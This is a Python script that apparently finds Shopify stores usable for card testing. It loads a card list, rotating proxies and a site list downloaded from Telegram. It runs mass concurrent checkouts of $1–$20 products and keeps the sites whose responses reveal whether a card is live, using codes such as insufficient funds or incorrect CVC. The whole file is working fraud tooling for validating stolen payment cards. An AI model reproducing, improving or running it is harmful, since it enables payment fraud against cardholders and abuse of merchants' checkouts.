#!/usr/bin/env python3
"""HQ site check — keep sites with a $1-$20 product that give a real card verdict.
Runs until --target good sites found. Logs: status time response amount site."""
import asyncio, sys, os, time, argparse
from pathlib import Path

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE))
from auto_async_v2 import run_checkout_for_card_async, normalize_proxy, CheckStatus

_REAL_RESULTS = (
    "CARD_DECLINED", "ORDER_PAID", "INSUFFICIENT_FUNDS", "3DS_REQUIRED",
    "INVALID_PAYMENT_METHOD", "INVALID_CVC", "INCORRECT_CVC", "EXPIRED",
    "INVALID_PURCHASE_TYPE", "TEST_MODE_LIVE_CARD", "DECISION_RULE_BLOCK",
    "AMOUNT_TOO_SMALL", "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
    "DO_NOT_HONOR", "GENERIC_DECLINE", "PROCESSING_ERROR", "PICK_UP_CARD",
    "GENERIC_ERROR", "ORDER_SUBMITTED", "EXPIRE_CARD", "CARD_NETWORK_NOT_ENABLED",
)
_REAL_KW = ("BASE CREDIT CARD IS EXPIRED", "CREDIT CARD BRAND IS NOT SUPPORTED",
            "BLOCKED BY CARTWATCH", "OUT OF STOCK")

def load(path):
    p = Path(path)
    if not p.is_file():
        raise SystemExit(f"missing: {p}")
    return [l.strip() for l in p.read_text(errors="ignore").splitlines() if l.strip() and not l.strip().startswith("#")]

async def run_one(site, cc, proxies, attempt_base):
    t0 = time.time()
    for attempt in range(2):
        proxy = normalize_proxy(proxies[(abs(hash(site)) + attempt_base + attempt) % len(proxies)])
        try:
            res = await run_checkout_for_card_async(site, cc, proxy, min_price=1.0, max_price=20.0)
        except Exception as e:
            if attempt < 1 and any(k in str(e).lower() for k in ("curl","timeout","connection","resolve")):
                continue
            return (site, "EXCEPTION", "", 0.0, round(time.time()-t0,1), False)
        code = (res.status_code or "").strip().upper() or "UNKNOWN"
        err = str(res.error)[:140].replace("\n"," ") if res.error else ""
        try: amt = float(res.amount or 0)
        except Exception: amt = 0.0
        real = res.status != CheckStatus.ERROR or code in _REAL_RESULTS
        if not real and any(k in (code + " | " + err).upper() for k in _REAL_KW):
            real = True
        if not real and attempt < 1 and any(k in err.lower() for k in ("catalog blocked","connection","timed out","timeout","curl:","resolve")):
            continue
        status_name = res.status.name if res.status is not None else "ERROR"
        return (site, status_name, code, amt, round(time.time()-t0,1), real)
    return (site, "EXCEPTION", "", 0.0, round(time.time()-t0,1), False)

async def worker(q, cc, proxies, good_counter, lock, good_f, existing, target, stop, tested_counter, attempt_base):
    while not stop.is_set():
        try:
            site = q.get_nowait()
        except asyncio.QueueEmpty:
            break
        if good_counter[0] >= target:
            stop.set(); break
        site, status, code, amt, dur, keep = await run_one(site, cc, proxies, attempt_base)
        async with lock:
            tested_counter[0] += 1
            if keep:
                good_counter[0] += 1
                if site not in existing:
                    good_f.write(site + "\n"); existing.add(site)
                print(f"{status:<9} {dur:>5}s  {code:<28} ${amt:>6.2f}  {site}", flush=True)
                if good_counter[0] >= target:
                    stop.set()
            elif tested_counter[0] % 100 == 0:
                print(f"  ... {tested_counter[0]} tested, {good_counter[0]} good", flush=True)
        q.task_done()

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sites", default="/home/zirconium/Downloads/Telegram Desktop/hqshopifysites.txt")
    ap.add_argument("--proxies", default="/home/zirconium/Downloads/Telegram Desktop/live_proxies_349.txt")
    ap.add_argument("--cc-file", default=str(BASE.parent / "archive" / "test" / "all_cards.txt"))
    ap.add_argument("--concurrency", type=int, default=150)
    ap.add_argument("--target", type=int, default=1000)
    ap.add_argument("--out", default="/tmp/hq_sitecheck")
    a = ap.parse_args()

    raw = load(a.sites)
    sites = []
    seen = set()
    for d in raw:
        d = d.strip().rstrip("/")
        if not d: continue
        if not d.startswith("http"): d = "https://" + d
        if d in seen: continue
        seen.add(d); sites.append(d)
    proxies = load(a.proxies)
    cards = load(a.cc_file)
    existing = set(load(str(BASE.parent / "site.txt")))
    os.makedirs(a.out, exist_ok=True)
    good_f = open(os.path.join(a.out, "good_sites.txt"), "a", buffering=1)

    q = asyncio.Queue()
    for s in sites: q.put_nowait(s)
    good_counter = [0]; tested_counter = [0]
    lock = asyncio.Lock(); stop = asyncio.Event()

    print(f"== HQ: {len(sites)} sites | {len(proxies)} proxies | {len(cards)} cards | {a.concurrency} workers | price $1-$20 | target {a.target} ==", flush=True)
    workers = [asyncio.create_task(worker(q, cards[i % len(cards)], proxies, good_counter, lock,
                                          good_f, existing, a.target, stop, tested_counter, i))
               for i in range(a.concurrency)]
    await asyncio.gather(*workers)
    good_f.close()
    print(f"== STOPPED == good={good_counter[0]} tested={tested_counter[0]} -> {a.out}/good_sites.txt", flush=True)

if __name__ == "__main__":
    asyncio.run(main())
